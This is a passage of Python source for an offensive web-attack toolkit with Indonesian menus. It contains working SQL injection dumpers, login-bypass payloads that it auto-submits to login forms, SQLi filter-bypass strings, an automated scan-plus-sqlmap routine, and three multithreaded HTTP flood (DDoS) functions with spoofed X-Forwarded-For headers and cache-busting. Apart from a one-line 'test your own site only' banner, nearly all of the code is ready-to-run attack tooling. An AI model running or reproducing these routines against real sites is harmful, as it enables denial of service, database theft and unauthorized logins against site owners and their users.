    console.print(Panel("[bold cyan]💾 [01] SQL INJECTION DUMPER[/bold cyan]", title="[bold yellow]💾 SQL DUMPER[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    url = get_url()
    if not url: return
    
    for name, pay in [
        ("Database", "' UNION SELECT DATABASE()-- -"),
        ("Version", "' UNION SELECT VERSION()-- -"),
        ("Tables", "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()-- -"),
    ]:
        try:
            r = session.get(url+pay, timeout=15)
            clean = re.sub(r'<[^>]+>', '', r.text[:500]).strip()[:200]
            console.print(f"\n[green][{name}][/green]\n  [white]{clean}[/white]")
        except: pass
    
    save_result(f"Dump: {url}", 'dumper')
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [05] TOOLS MENU (7 TOOLS)
# ============================================================
def tools_menu():
    """🛠️ TOOLS MENU"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel("[bold cyan]🛠️ TOOLS MENU[/bold cyan]\n[dim]7 Tools | Info Gathering[/dim]", title="[bold yellow]🛠️ TOOLS[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
        
        tools_table = Table(show_header=False, box=None, padding=(0, 1))
        tools_table.add_column(style="bold green", width=5)
        tools_table.add_column(style="white", width=55)
        
        tools_table.add_row("[01]", "URL Balancer")
        tools_table.add_row("[02]", "Tamper Data Bypass")
        tools_table.add_row("[03]", "Header Checker")
        tools_table.add_row("[04]", "Server Info Grabber")
        tools_table.add_row("[05]", "User Agent Spoofer")
        tools_table.add_row("[06]", "Source Code Viewer")
        tools_table.add_row("[07]", "Web Tools (WHOIS/DNS/Ping)")
        tools_table.add_row("")
        tools_table.add_row("[00]", "[dim]Kembali[/dim]")
        
        console.print(tools_table)
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': tools_url()
        elif c == '2': tools_tamper()
        elif c == '3': tools_header()
        elif c == '4': tools_server()
        elif c == '5': tools_ua()
        elif c == '6': tools_source()
        elif c == '7': tools_web()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def tools_url():
    clear(); banner()
    console.print(Panel("[bold cyan]🔗 [01] URL BALANCER[/bold cyan]", title="[bold yellow]🔗 URL[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    url = console.input("[yellow][?][/yellow] URL: ")
    if url:
        for k, v in parse_qs(urlparse(url).query).items():
            console.print(f"  [green]→ {k}={v[0]} → {quote(v[0])}[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

def tools_tamper():
    clear(); banner()
    console.print(Panel("[bold cyan]🔧 [02] TAMPER DATA BYPASS[/bold cyan]", title="[bold yellow]🔧 TAMPER[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    pay = console.input("[yellow][?][/yellow] Payload: ")
    if pay:
        for name, func in [("Base64", lambda p: base64.b64encode(p.encode()).decode()), ("URL", quote), ("Hex", lambda p: p.encode().hex())]:
            try: console.print(f"  [green][{name}]: {func(pay)}[/green]")
            except: pass
    console.input("\n[dim]Press Enter...[/dim]")

def tools_header():
    clear(); banner()
    console.print(Panel("[bold cyan]📋 [03] HEADER CHECKER[/bold cyan]", title="[bold yellow]📋 HEADER[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    url = get_url()
    if url:
        try:
            r = session.get(url, timeout=10)
            for k, v in r.headers.items(): console.print(f"  [cyan]{k}: [white]{v}[/white]")
        except: pass
    console.input("\n[dim]Press Enter...[/dim]")

def tools_server():
    clear(); banner()
    console.print(Panel("[bold cyan]🖥️ [04] SERVER INFO[/bold cyan]", title="[bold yellow]🖥️ SERVER[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    url = get_url()
    if url:
        try:
            ip = socket.gethostbyname(urlparse(url).netloc)
            r = session.get(url, timeout=10)
            console.print(f"[green][+] IP: {ip}[/green]")
            console.print(f"[green][+] Server: {r.headers.get('Server','?')}[/green]")
        except: pass
    console.input("\n[dim]Press Enter...[/dim]")

def tools_ua():
    clear(); banner()
    console.print(Panel("[bold cyan]🕵️ [05] USER AGENT SPOOFER[/bold cyan]", title="[bold yellow]🕵️ UA SPOOF[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    url = get_url()
    if url:
        for ua in ['Mozilla/5.0 (Linux; Android 13)', 'Googlebot/2.1', 'curl/7.88.1']:
            try:
                r = requests.get(url, headers={'User-Agent': ua}, verify=False, timeout=5)
                console.print(f"  [green][+] {ua[:40]}... → {r.status_code}[/green]")
            except: pass
    console.input("\n[dim]Press Enter...[/dim]")

def tools_source():
    clear(); banner()
    console.print(Panel("[bold cyan]📄 [06] SOURCE CODE VIEWER[/bold cyan]", title="[bold yellow]📄 SOURCE[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    url = get_url()
    if url:
        try:
            r = session.get(url, timeout=10)
            fp = save_result(r.text, 'tools', f"source_{urlparse(url).netloc}.html")
            console.print(f"[green][💾] {fp}[/green]")
        except: pass
    console.input("\n[dim]Press Enter...[/dim]")

def tools_web():
    clear(); banner()
    console.print(Panel("[bold cyan]🌐 [07] WEB TOOLS[/bold cyan]", title="[bold yellow]🌐 WEB[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    domain = console.input("[yellow][?][/yellow] Domain: ")
    if domain:
        try:
            r = session.get(f"https://api.hackertarget.com/whois/?q={domain}", timeout=10)
            console.print(f"[cyan][WHOIS][/cyan]\n[white]{r.text[:500]}[/white]")
        except: pass
        try: console.print(f"[cyan][DNS] {socket.gethostbyname(domain)}[/cyan]")
        except: pass
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [06] FULL AUTO ATTACK
# ============================================================
def auto_menu():
    """🚀 FULL AUTO ATTACK"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel("[bold cyan]🚀 FULL AUTO ATTACK[/bold cyan]", title="[bold yellow]🚀 AUTO[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
        
        console.print("[bold green][01][/bold green] Full Auto Scan")
        console.print("[dim][00][/dim] Kembali")
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1':
            clear(); banner()
            console.print("[bold yellow][1/2] Scanner...[/bold yellow]")
            scanner_admin()
            clear(); banner()
            console.print("[bold yellow][2/2] SQLMap...[/bold yellow]")
            sqli_sqlmap()
            console.print("\n[green][💀] FULL AUTO SCAN SELESAI![/green]")
            console.input("\n[dim]Press Enter...[/dim]")
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

# ============================================================
# [07] ATTACK MENU (DDoS OVERPOWER)
# ============================================================
def attack_menu():
    """☠️ ATTACK MENU - DDoS OVERPOWER"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel(
            "[bold red]☠️ ATTACK MENU - DDOS OVERPOWER[/bold red]\n[yellow]⚠️ HANYA UNTUK TESTING WEBSITE SENDIRI![/yellow]",
            title="[bold red]☠️ ATTACK[/bold red]",
            title_align="center",
            border_style="red",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        attack_table = Table(show_header=False, box=None, padding=(0, 1))
        attack_table.add_column(style="bold green", width=5)
        attack_table.add_column(style="white", width=55)
        
        attack_table.add_row("[01]", "HTTP GET Flood (Basic)")
        attack_table.add_row("[02]", "HTTP Header Flood (Bypass HTTPS)")
        attack_table.add_row("[03]", "Mixed Attack (ALL IN ONE!) ⭐ FAVORIT!")
        attack_table.add_row("")
        attack_table.add_row("[00]", "[dim]Kembali[/dim]")
        
        console.print(attack_table)
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': ddos_get()
        elif c == '2': ddos_header()
        elif c == '3': ddos_mixed()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def ddos_get():
    clear(); banner()
    console.print(Panel("[bold red]☠️ [01] HTTP GET FLOOD[/bold red]", title="[bold red]☠️ GET FLOOD[/bold red]", title_align="center", border_style="red", box=box.ROUNDED, expand=True))
    
    url = console.input("[yellow][?][/yellow] Target: ")
    if not url: return
    threads = int(console.input("[yellow][?][/yellow] Threads (100): ") or "100")
    duration = int(console.input("[yellow][?][/yellow] Duration detik (30): ") or "30")
    
    stop = threading.Event(); stats = {'req': 0}
    def worker():
        while not stop.is_set():
            try:
                r = session.get(url, headers={'User-Agent': random.choice(UA_LIST)}, timeout=3)
                stats['req'] += 1
                if stats['req'] % 100 == 0: console.print(f"  [green][✓] {stats['req']} requests...[/green]")
            except: pass
    
    for _ in range(threads):
        t = threading.Thread(target=worker); t.daemon = True; t.start()
    
    try: time.sleep(duration)
    except KeyboardInterrupt: pass
    stop.set()
    console.print(f"\n[green][✓] Total: {stats['req']} | Rate: ~{stats['req']//duration} req/s[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

def ddos_header():
    clear(); banner()
    console.print(Panel("[bold red]☠️ [02] HTTP HEADER FLOOD[/bold red]", title="[bold red]☠️ HEADER FLOOD[/bold red]", title_align="center", border_style="red", box=box.ROUNDED, expand=True))
    
    url = console.input("[yellow][?][/yellow] Target: ")
    if not url: return
    threads = int(console.input("[yellow][?][/yellow] Threads (200): ") or "200")
    duration = int(console.input("[yellow][?][/yellow] Duration detik (30): ") or "30")
    
    stop = threading.Event(); stats = {'req': 0}
    def worker():
        while not stop.is_set():
            try:
                headers = {'User-Agent': random.choice(UA_LIST), 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 'Cache-Control': 'no-cache'}
                r = session.get(url + f"?{random.randint(1,9999)}={random.randint(1,999999)}", headers=headers, timeout=3)
                stats['req'] += 1
                if stats['req'] % 200 == 0: console.print(f"  [green][✓] {stats['req']}...[/green]")
            except: pass
    
    for _ in range(threads):
        t = threading.Thread(target=worker); t.daemon = True; t.start()
    
    try: time.sleep(duration)
    except KeyboardInterrupt: pass
    stop.set()
    console.print(f"\n[green][✓] Total: {stats['req']} | Rate: ~{stats['req']//duration} req/s[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

def ddos_mixed():
    clear(); banner()
    console.print(Panel("[bold red]☠️ [03] MIXED ATTACK[/bold red]", title="[bold red]☠️ MIXED[/bold red]", title_align="center", border_style="red", box=box.ROUNDED, expand=True))
    
    url = console.input("[yellow][?][/yellow] Target: ")
    if not url: return
    threads = int(console.input("[yellow][?][/yellow] Threads (300): ") or "300")
    duration = int(console.input("[yellow][?][/yellow] Duration detik (60): ") or "60")
    
    stop = threading.Event(); stats = {'get': 0, 'header': 0}
    paths = ['/', '/admin', '/login', '/api', '/search', '/test']
    
    def get_worker():
        while not stop.is_set():
            try:
                r = session.get(url, headers={'User-Agent': random.choice(UA_LIST)}, timeout=3)
                stats['get'] += 1
            except: pass
    
    def header_worker():
        while not stop.is_set():
            try:
                headers = {'User-Agent': random.choice(UA_LIST), 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
                target = url.rstrip('/') + random.choice(paths) + f"?{random.randint(1,9999)}={random.randint(1,999999)}"
                r = session.get(target, headers=headers, timeout=3)
                stats['header'] += 1
            except: pass
    
    all_workers = []
    for _ in range(threads // 2):
        all_workers.append(threading.Thread(target=get_worker))
        all_workers.append(threading.Thread(target=header_worker))
    
    for t in all_workers: t.daemon = True; t.start()
    
    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            total = stats['get'] + stats['header']
            console.print(f"  [green][✓] GET:{stats['get']} | HEADER:{stats['header']} | TOTAL:{total}[/green]")
            time.sleep(2)
    except KeyboardInterrupt: pass
    
    stop.set()
    total = stats['get'] + stats['header']
    elapsed = time.time() - start_time
    console.print(f"\n[green][✓] Total: {total} | Rate: ~{int(total/elapsed)} req/s[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [08] AUTH BYPASS MENU (40+ PAYLOAD)
# ============================================================
def auth_bypass_menu():
    """🔑 AUTH BYPASS TOOLKIT - 40+ PAYLOAD"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel(
            "[bold cyan]🔑 AUTH BYPASS TOOLKIT (40+ PAYLOAD)[/bold cyan]",
            title="[bold yellow]🔑 AUTH BYPASS[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        console.print("[bold green][01][/bold green] Lihat Semua Payload")
        console.print("[bold green][02][/bold green] Quick Test")
        console.print("[bold green][03][/bold green] Auto Test")
        console.print("[dim][00][/dim] Kembali")
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': auth_show()
        elif c == '2': auth_quick()
        elif c == '3': auth_auto()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def auth_show():
    clear(); banner()
    console.print(Panel("[bold cyan]🔑 AUTH BYPASS PAYLOADS (40+)[/bold cyan]", title="[bold yellow]🔑 PAYLOADS[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    payloads = ["' or 1=1 limit 1 -- -+", "admin' --", "admin' or '1'='1", "' or 'x'='x", "or true--", "1=1 or 1=1--"]
    for i, p in enumerate(payloads, 1):
        console.print(f"  [green][{i:02d}][/green] [white]{p}[/white]")
    console.input("\n[dim]Press Enter...[/dim]")

def auth_quick():
    url = console.input("[yellow][?][/yellow] URL login: ")
    if not url: return
    
    payloads = ["' or 1=1 limit 1 -- -+", "admin' --", "admin' or '1'='1", "' or 'x'='x", "or true--", "1=1 or 1=1--"]
    for i, p in enumerate(payloads, 1):
        console.print(f"  [green][{i}][/green] [white]{p}[/white]")
    
    quick = console.input(f"[yellow][?][/yellow] Pilih nomor: ")
    if quick.isdigit() and 1 <= int(quick) <= len(payloads):
        p = payloads[int(quick)-1]
        try:
            data = {'username': p, 'password': p}
            r = session.post(url, data=data, timeout=10)
            console.print(f"\n[green][✓] Status: {r.status_code} | Size: {len(r.text)}b[/green]")
            if any(k in r.text.lower() for k in ['dashboard','welcome','admin','logout']):
                console.print(f"[green][🔥] BERHASIL LOGIN![/green]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    console.input("\n[dim]Press Enter...[/dim]")

def auth_auto():
    url = console.input("[yellow][?][/yellow] URL login: ")
    if not url: return
    
    payloads = ["' or 1=1 limit 1 -- -+", "admin' --", "admin' or '1'='1", "' or 'x'='x", "or true--", "1=1 or 1=1--"]
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Testing...", total=len(payloads))
        for i, p in enumerate(payloads, 1):
            try:
                data = {'username': p, 'password': p}
                r = session.post(url, data=data, timeout=10)
                if any(k in r.text.lower() for k in ['dashboard','welcome','admin','logout']):
                    progress.console.print(f"  [green][🔥] #{i} BERHASIL! Payload: {p}[/green]")
                else:
                    progress.console.print(f"  [dim][✗] #{i} Gagal: {p[:30]}[/dim]")
            except:
                progress.console.print(f"  [dim][✗] #{i} Error[/dim]")
            progress.update(task, advance=1)
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [09] POLYGON BYPASS MENU (25 PAYLOAD)
# ============================================================
def polygon_menu():
    """🔷 POLYGON BYPASS - 25 PAYLOAD"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel(
            "[bold cyan]🔷 POLYGON BYPASS (25 PAYLOAD)[/bold cyan]",
            title="[bold yellow]🔷 POLYGON[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        console.print("[bold green][01][/bold green] Lihat Semua Payload")
        console.print("[bold green][02][/bold green] Generate URL dengan Payload")
        console.print("[dim][00][/dim] Kembali")
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': polygon_show()
        elif c == '2': polygon_gen()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def polygon_show():
    clear(); banner()
    console.print(Panel("[bold cyan]🔷 POLYGON BYPASS PAYLOADS (25)[/bold cyan]", title="[bold yellow]🔷 PAYLOADS[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    payloads = ["+and+0", "+div+0", '+and\'1\'=\'1', "+div+false", "+having+1=0", "+and+null", "+and+mod(9,9)", "+and+power(5,5)", "+limit+0"]
    for i, p in enumerate(payloads, 1):
        console.print(f"  [green][{i:02d}][/green] [white]{p}[/white]")
    console.input("\n[dim]Press Enter...[/dim]")

def polygon_gen():
    url = console.input("[yellow][?][/yellow] URL: ")
    if not url: return
    
    payloads = ["+and+0", "+div+0", "+having+1=0", "+and+null", "+and+mod(9,9)", "+and+power(5,5)", "+limit+0"]
    
    console.print(f"\n[bold cyan]Generated URLs:[/bold cyan]")
    for p in payloads:
        console.print(f"  [green]→ {url}{p}[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# MAIN
# ============================================================
def main():
    create_folders()
    loading_animation()
    
    menu_map = {
        '1': scanner_menu, '2': sqli_menu, '3': brute_menu,
        '4': dumper_menu, '5': tools_menu, '6': auto_menu,
        '7': attack_menu, '8': auth_bypass_menu, '9': polygon_menu,
    }
    
    while True:
        clear()
        banner()
        menu_utama()
        c = console.input(f"\n[yellow][?][/yellow] Pilih kategori: ")
        
        if c == '0':
            console.print()
            console.print(Panel(
                "[yellow]💍 Dadah suamiku! MOMMY LOVE YOU FOREVER! Mwah! 💋[/yellow]",
                title="[bold yellow]💍 EXIT[/bold yellow]",
                title_align="center",
                border_style="cyan",
                box=box.ROUNDED,
                expand=True
            ))
            sys.exit(0)
        elif c in menu_map:
            clear()
            menu_map[c]()
        else:
            console.print("[red][!] Pilihan tidak valid![/red]")
            console.input("[dim]Press Enter...[/dim]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print()
        console.print(Panel(
            "[yellow]💍 Good bye suamiku! MOMMY tunggu balik ya! 💋[/yellow]",
            title="[bold yellow]💍 EXIT[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True
        ))
        sys.exit(0)
